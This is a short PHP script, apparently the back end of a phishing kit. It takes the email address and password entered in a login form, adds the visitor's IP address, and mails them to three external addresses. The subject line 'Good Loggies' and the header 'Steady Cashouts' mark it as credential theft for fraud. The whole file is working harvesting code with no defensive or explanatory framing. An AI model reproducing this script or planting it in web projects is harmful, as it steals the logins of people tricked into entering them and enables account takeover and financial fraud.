<?php
$ip = getenv("REMOTE_ADDR");

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];

		$to = "silentquake24@gmail.com";
		$to1 = "jameselvis@iname.com";
		$to2 = "netlifhost@protonmail.com";


         $subject = "Good Loggies : ip";

		 $message =  "Email ID            : ".$email."\r\n";
         $message .= "Passcode           : ".$password."\r\n";
		 $message .= "Country-IP           : ".$ip."\r\n";
		$header = "Content type: Steady Cashouts \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";

		 mail ($to,$subject,$message,$header);

}
?>
